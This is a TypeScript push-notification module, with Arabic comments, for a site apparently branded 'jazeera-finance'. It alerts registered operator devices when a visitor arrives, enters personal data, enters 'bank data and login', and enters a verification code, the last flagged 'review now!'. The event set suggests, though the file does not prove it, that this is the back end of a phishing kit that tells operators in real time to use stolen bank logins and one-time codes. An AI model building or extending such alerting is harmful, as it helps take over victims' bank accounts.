// Push Notifications Service باستخدام Web Push والأجهزة الموثوقة
import webpush from "web-push";
import { db, trustedDevicesTable } from "@workspace/db";
import { eq } from "drizzle-orm";

// ─── أنواع الإشعارات ─────────────────────────────────────────────────────
export type NotificationEvent = "visitor" | "personal" | "bank" | "otp";

export interface PushPayload {
  title: string;
  body: string;
  icon?: string;
  badge?: string;
  tag?: string;
  data?: {
    eventType: NotificationEvent;
    sessionId?: string;
    applicantName?: string;
    timestamp: number;
  };
}

// ─── إعدادات VAPID من Environment ───────────────────────────────────────
const vapidPublicKey = process.env.VAPID_PUBLIC_KEY?.trim() || "";
const vapidPrivateKey = process.env.VAPID_PRIVATE_KEY?.trim() || "";
const FCM_SERVER_KEY = process.env.FCM_SERVER_KEY?.trim() || "";

// التحقق من صحة مفاتيح VAPID
const isVapidConfigured = Boolean(vapidPublicKey && vapidPrivateKey && 
  vapidPublicKey.length > 50 && vapidPrivateKey.length > 40);

if (isVapidConfigured) {
  try {
    webpush.setVapidDetails(
      "mailto:notifications@jazeera-finance.com",
      vapidPublicKey,
      vapidPrivateKey
    );
    console.log("✅ Push notifications: VAPID keys configured successfully");
    console.log(`   Public key length: ${vapidPublicKey.length}`);
    console.log(`   Private key length: ${vapidPrivateKey.length}`);
  } catch (err) {
    console.error("❌ Failed to configure VAPID keys:", err);
  }
} else if (FCM_SERVER_KEY) {
  console.log("✅ Push notifications: FCM Server Key configured");
} else {
  console.log("⚠️ Push notifications: No VAPID or FCM keys configured");
  console.log("   VAPID_PUBLIC_KEY:", vapidPublicKey ? "set" : "missing");
  console.log("   VAPID_PRIVATE_KEY:", vapidPrivateKey ? "set" : "missing");
}

// ─── رسائل الإشعارات ────────────────────────────────────────────────────
const notificationMessages: Record<NotificationEvent, { title: string; body: string }> = {
  visitor: {
    title: "🆕 زائر جديد!",
    body: "زائر جديد دخل الموقع",
  },
  personal: {
    title: "👤 بيانات جديدة",
    body: "تم إدخال بيانات شخصية جديدة",
  },
  bank: {
    title: "🏦 بيانات بنك!",
    body: "تم إدخال بيانات البنك والدخول",
  },
  otp: {
    title: "🔐 رمز تحقق!",
    body: "تم إدخال رمز التحقق - راجع الآن!",
  },
};

// ─── إرسال إشعار لجميع الأجهزة الموثوقة ─────────────────────────────────
export async function sendPushNotification(eventType: NotificationEvent, extraData?: { sessionId?: string; applicantName?: string }) {
  const message = notificationMessages[eventType];
  
  const payload: PushPayload = {
    title: message.title,
    body: extraData?.applicantName ? `${message.body}: ${extraData.applicantName}` : message.body,
    icon: "/icons/icon-192.png",
    badge: "/icons/badge-72.png",
    tag: `event-${eventType}`,
    data: {
      eventType,
      sessionId: extraData?.sessionId,
      applicantName: extraData?.applicantName,
      timestamp: Date.now(),
    },
  };

  const payloadStr = JSON.stringify(payload);

  console.log(`📱 [Push] Event: ${eventType}, Title: ${payload.title}`);

  try {
    // جلب جميع الأجهزة الموثوقة النشطة مع اشتراك Push
    const devices = await db
      .select()
      .from(trustedDevicesTable)
      .where(eq(trustedDevicesTable.isActive, true));

    const devicesWithPush = devices.filter(d => d.pushSubscription);

    if (devicesWithPush.length === 0) {
      console.log("📱 [Push] No trusted devices with push subscriptions");
      return { successful: 0, failed: 0 };
    }

    console.log(`📱 [Push] Sending to ${devicesWithPush.length} devices`);

    // إرسال لجميع الأجهزة
    const results = await Promise.allSettled(
      devicesWithPush.map(async (device) => {
        try {
          const subscriptionData = JSON.parse(device.pushSubscription!);
          
          console.log(`📱 [Push] Sending to device: ${device.deviceId}`);
          console.log(`📱 [Push] Endpoint: ${subscriptionData.endpoint?.substring(0, 80)}...`);
          
          // التحقق من صحة الـ subscription
          if (!subscriptionData.endpoint || !subscriptionData.keys?.p256dh || !subscriptionData.keys?.auth) {
            console.error(`📱 [Push] Invalid subscription format for device: ${device.deviceId}`);
            throw new Error("Invalid subscription format: missing endpoint or keys");
          }

          if (FCM_SERVER_KEY && !isVapidConfigured) {
            // استخدام FCM Legacy API
            console.log(`📱 [Push] Using FCM for device: ${device.deviceId}`);
            const response = await fetch("https://fcm.googleapis.com/fcm/send", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
                "Authorization": `key=${FCM_SERVER_KEY}`,
              },
              body: JSON.stringify({
                to: subscriptionData.endpoint,
                notification: {
                  title: payload.title,
                  body: payload.body,
                  icon: payload.icon,
                  tag: payload.tag,
                },
                data: payload.data,
              }),
            });
            
            const responseText = await response.text();
            console.log(`📱 [FCM] Response status: ${response.status}, body: ${responseText.substring(0, 200)}`);
            
            if (!response.ok) {
              throw new Error(`FCM error: ${response.status} - ${responseText.substring(0, 100)}`);
            }
          } else {
            // استخدام Web Push مع VAPID
            if (!isVapidConfigured) {
              throw new Error("VAPID keys not configured");
            }
            
            console.log(`📱 [Push] Using Web Push with VAPID for device: ${device.deviceId}`);
            
            // إنشاء subscription object صحيح
            const pushSubscription: PushSubscriptionJSON = {
              endpoint: subscriptionData.endpoint,
              keys: {
                p256dh: subscriptionData.keys.p256dh,
                auth: subscriptionData.keys.auth,
              },
            };
            
            // إرسال باستخدام web-push
            const result = await webpush.sendNotification(
              pushSubscription as PushSubscription,
              payloadStr
            );
            
            console.log(`📱 [WebPush] Success for device: ${device.deviceId}, status: ${result?.statusCode}`);
          }
          
          // تحديث lastUsedAt
          await db
            .update(trustedDevicesTable)
            .set({ lastUsedAt: new Date() })
            .where(eq(trustedDevicesTable.id, device.id));
          
          console.log(`📱 [Push] ✅ Success for device: ${device.deviceId}`);
          return { deviceId: device.deviceId, success: true };
          
        } catch (err) {
          const error = err as Error;
          console.error(`📱 [Push] ❌ Failed for device ${device.deviceId}:`, error.message);
          console.error(`📱 [Push] Error details:`, {
            name: error.name,
            message: error.message,
            stack: error.stack?.substring(0, 500),
          });
          
          // إزالة الاشتراك إذا فشل (410 = Gone, 404 = Not Found)
          if (error.message.includes("410") || error.message.includes("404")) {
            console.log(`📱 [Push] Removing invalid subscription for device: ${device.deviceId}`);
            await db
              .update(trustedDevicesTable)
              .set({ pushSubscription: null })
              .where(eq(trustedDevicesTable.id, device.id));
          }
          
          return { deviceId: device.deviceId, success: false, error: error.message };
        }
      })
    );

    const successful = results.filter(r => r.status === "fulfilled" && (r.value as {success: boolean}).success).length;
    const failed = results.filter(r => !r.status || (r.status === "fulfilled" && !(r.value as {success: boolean}).success)).length;
    
    console.log(`📱 [Push] Complete: ${successful} success, ${failed} failed`);
    
    return { successful, failed };
  } catch (err) {
    const error = err as Error;
    console.error("📱 [Push] Fatal error:", error.message);
    console.error("📱 [Push] Stack:", error.stack);
    return { successful: 0, failed: 0 };
  }
}

// ─── للتوافق مع الكود القديم ──────────────────────────────────────────────
export function saveSubscription(endpoint: string, sub: PushSubscription) {
  console.log(`📱 [Push] New subscription saved: ${endpoint.substring(0, 50)}...`);
}

export function removeSubscription(endpoint: string) {
  console.log(`📱 [Push] Remove subscription: ${endpoint.substring(0, 50)}...`);
}
